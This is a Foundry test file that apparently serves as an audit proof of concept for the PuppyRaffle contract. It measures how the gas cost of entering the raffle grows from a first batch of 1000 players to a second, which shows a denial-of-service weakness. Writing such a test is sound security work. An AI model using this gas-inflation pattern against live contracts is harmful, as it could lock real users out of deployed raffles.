// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract DoSTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = makeAddr("feeAddress");
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function test_dos() public {
        //Setting the gas price to 1
        vm.txGasPrice(1);
        //Lets enter 1000 players
        address[] memory players = new address[](1000);
        for(uint i = 0; i<1000; i++){
            players[i] = address(i);
        }
        //Gas cost for entering the first 1000 players
        uint256 gasStartA = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEndA = gasleft();
        uint256 gasUsedA = (gasStartA - gasEndA) * tx.gasprice;
        console.log("Gas cost for entering the first 1000 players: ", gasUsedA);

        //Lets enter another 1000 players
        for(uint i = 0; i<1000; i++){
            players[i] = address(i+1000);
        }
        //Gas cost for entering the second 1000 players
        uint256 gasStartB = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEndB = gasleft();
        uint256 gasUsedB = (gasStartB - gasEndB) * tx.gasprice;
        console.log("Gas cost for entering the second 1000 players: ", gasUsedB);

        assertTrue(gasUsedA < gasUsedB);
    }

}
